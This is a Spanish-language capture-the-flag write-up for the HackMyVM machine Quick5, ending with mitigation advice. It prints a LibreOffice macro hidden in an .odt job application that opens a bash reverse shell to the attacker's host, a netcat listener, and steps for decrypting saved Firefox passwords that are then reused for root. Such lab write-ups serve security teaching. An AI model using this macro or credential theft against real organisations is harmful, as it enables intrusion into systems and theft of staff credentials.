# Writeup: Máquina Quick5 - HackMyVM

En este writeup detallo el proceso de explotación y escalada de privilegios de la máquina **Quick5** de la plataforma HackMyVM. La resolución abarca desde la enumeración de un sitio corporativo con múltiples subdominios, hasta la obtención de acceso inicial mediante un ataque del lado cliente sobre un proceso de selección de personal, y una escalada de privilegios basada en la recuperación de credenciales cifradas almacenadas por el navegador Firefox.

---

## Resumen

Quick5 es una máquina Linux (Ubuntu) que simula el sitio web de una empresa de automoción con varios subdominios internos. El vector de entrada no explota ninguna vulnerabilidad de servicio, sino el propio proceso humano de selección de personal: un formulario de solicitud de empleo acepta documentos ofimáticos, lo que permite subir un `.odt` con una macro maliciosa que se ejecuta al ser revisado internamente. La escalada de privilegios posterior tampoco depende de un binario mal configurado, sino de credenciales guardadas en el gestor de contraseñas de Firefox, recuperables porque el perfil no está protegido con contraseña maestra, y directamente reutilizables como root.

---

## 1. Reconocimiento Inicial

Ejecutamos un escaneo de puertos completo con `nmap` para descubrir los servicios expuestos:

```bash
root@kali:~/hmv/Quick5/nmap# nmap -p- --open -sSCV -n -Pn 192.168.0.27 -oN tcpScan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 18:44 +0200
Nmap scan report for 192.168.0.27
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
|_  256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Quick Automative - Home
MAC Address: 08:00:27:02:60:6D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dado que la versión de OpenSSH es 8.9p1 (superior a la 7.7, lo que dificulta la enumeración de usuarios por temporización), centramos nuestros esfuerzos en el puerto 80 (HTTP).

---

## 2. Enumeración Web

Ejecutamos `whatweb` sobre el servicio HTTP para extraer tecnologías e información de cabecera:

```bash
root@kali:~/hmv/Quick5/nmap# whatweb http://192.168.0.27
http://192.168.0.27 [200 OK] Apache[2.4.52], Bootstrap[4], Country[RESERVED][ZZ], Email[book@quick.hmv,info@quick.hmv,tech@quick.hmv], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.27], JQuery[3.4.1], Script, Title[Quick Automative - Home]
```

Obtenemos varios correos (`book@`, `info@`, `tech@quick.hmv`) y confirmamos el dominio `quick.hmv`. Al examinar manualmente la aplicación web destacan dos hallazgos:
- Se muestran los nombres de 8 empleados, idóneos para construir un diccionario de usuarios potenciales.
- Existen dos formularios de contacto que permiten enviar mensajes, representando posibles vectores para probar inyecciones.

Al inspeccionar los enlaces mediante el cursor, se revelan además los subdominios `careers.quick.hmv` y `customer.quick.hmv` — indicio de **virtual hosting**, y motivo para fuzzear en busca de más vhosts sin enlazar.

Procedemos a incluir los dominios encontrados en el archivo `/etc/hosts`:

```text
192.168.0.27 quick.hmv careers.quick.hmv customer.quick.hmv
```

Al visitar `customer.quick.hmv`, se observa el siguiente aviso:

> "This page is under maintenance due to a security incident."

Este tipo de mensaje, expuesto públicamente, insinúa la posible presencia de un *backdoor* o punto de entrada no remediado de un incidente previo.

### Fuzzing de Virtual Hosts (VHosts)

Realizamos enumeración de subdominios con `gobuster` para localizar otros vhosts activos:

```bash
root@kali:~/hmv/Quick5/nmap# gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://quick.hmv -r --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://quick.hmv
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
careers.quick.hmv Status: 200 [Size: 13819]
customer.quick.hmv Status: 200 [Size: 2258]
employee.quick.hmv Status: 200 [Size: 2258]
===============================================================
Finished
===============================================================
```

Descubrimos un nuevo subdominio, `employee.quick.hmv`. Tras añadirlo a `/etc/hosts`, comprobamos que despliega el mismo contenido de mantenimiento que `customer.quick.hmv`, sin nada explotable adicional por esta vía.

En `careers.quick.hmv`, en cambio, es posible aplicar a un puesto de trabajo. El formulario pide adjuntar dos archivos (currículum y carta), cada uno en formato `.odt` o `.pdf`, que serán revisados por alguien de la empresa — la superficie de ataque más prometedora de toda la enumeración.

---

## 3. Explotación (Initial Access)

Dado que los documentos subidos van a ser abiertos por una persona real dentro de la organización, investigamos cómo construir un `.odt` que ejecute código al abrirse.

Abrimos LibreOffice Writer, añadimos texto cualquiera y creamos una nueva macro con el payload para obtener una shell inversa:

```basic
Sub Main
    shell("bash -c 'bash -i >& /dev/tcp/192.168.0.43/443 2>&1'")
End Sub
```

Configuramos el evento para que la macro se ejecute automáticamente al abrir el archivo y guardamos el documento en formato `.odt`. Levantamos un listener en nuestra máquina atacante y subimos el archivo a través del formulario de `careers.quick.hmv`:

```bash
nc -lvnp 443
```

Tras unos momentos, el archivo es procesado en la máquina víctima y recibimos una conexión reversa como el usuario `andrew`, lo que nos permite leer la primera flag.

---

## 4. Escalada de Privilegios

### 4.1. De `andrew` a `root`

Tras estabilizar la terminal, iniciamos la enumeración local en busca de credenciales:

```bash
grep -r "pass" / 2>/dev/null
```

El volumen de resultados es tan alto que cancelamos el comando, pero al inicio de la salida destaca un archivo de perfil de Firefox:

```
/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json
```

![Captura de logins.json](images/quick-2.jpg)

Este archivo contiene los campos `encryptedUsername` y `encryptedPassword`. Probamos `hashid` y `hashcat` sobre estos valores sin ningún resultado — y no es casualidad: Firefox no almacena estas credenciales como un hash tradicional, sino cifradas mediante **NSS** (Network Security Services), un mecanismo reversible pensado para que el propio navegador recupere la contraseña en texto plano al rellenar un formulario. Lo que hace falta aquí no es crackear, sino descifrar.

Para descifrar los datos de Firefox empleamos la herramienta [firefox_decrypt](https://github.com/unode/firefox_decrypt). Al ejecutarla directamente, falla: no encuentra `profiles.ini` en la ruta habitual (`~/.mozilla/firefox`). La razón es que Firefox está instalado vía **Snap**, cuyo sandboxing redirige el almacenamiento de datos de usuario a una ruta distinta dentro de `~/snap/`. Buscando en el sistema los archivos `.ini` filtrando por el usuario `andrew`, localizamos la ruta real:

```bash
/home/andrew/snap/firefox/common/.mozilla/firefox/profiles.ini
```

Ejecutamos el script apuntando al directorio base correcto:

```bash
andrew@quick5:~$ ./firefox_decrypt.py /home/andrew/snap/firefox/common/.mozilla/firefox

Website:   http://employee.quick.hmv
Username: 'andrew.speed@quick.hmv'
Password: 'SuperSecretPassword'
```

Estas credenciales estaban pensadas para un portal interno de bajo privilegio, pero probamos su reutilización directamente contra el usuario `root`, y la autenticación resulta exitosa. Obtenemos acceso total con privilegios elevados junto a la flag final.

---

## 5. Detección y Mitigación

- **Mensajes de mantenimiento que revelan información sensible**: anunciar públicamente que un subdominio está caído "por un incidente de seguridad" informa a cualquier atacante de que el sistema tiene un historial de compromiso. Este tipo de mensajes no debería exponer contexto de seguridad, ni siquiera de forma indirecta.
- **Formularios de subida de documentos sin sandboxing**: un proceso de selección que abre documentos de candidatos externos debería hacerlo en un entorno aislado (máquina virtual desechable o sandbox de documentos), nunca directamente en un sistema con acceso a datos internos.
- **Macros habilitadas por defecto en documentos externos**: cualquier documento ofimático recibido de una fuente externa debería abrirse con las macros deshabilitadas por política, o convertirse a un formato sin capacidad de ejecución antes de su revisión.
- **Credenciales de servicios internos guardadas en el gestor de contraseñas del navegador sin contraseña maestra**: Firefox permite cifrar `logins.json` con una master password adicional; en este caso no estaba activa, ya que el descifrado funcionó sin necesidad de ella.
- **Reutilización de contraseñas entre una cuenta de aplicación de bajo privilegio y la cuenta root**: ninguna credencial de un portal interno debería coincidir con la de una cuenta administrativa del sistema operativo — son superficies de riesgo distintas y deberían gestionarse por separado.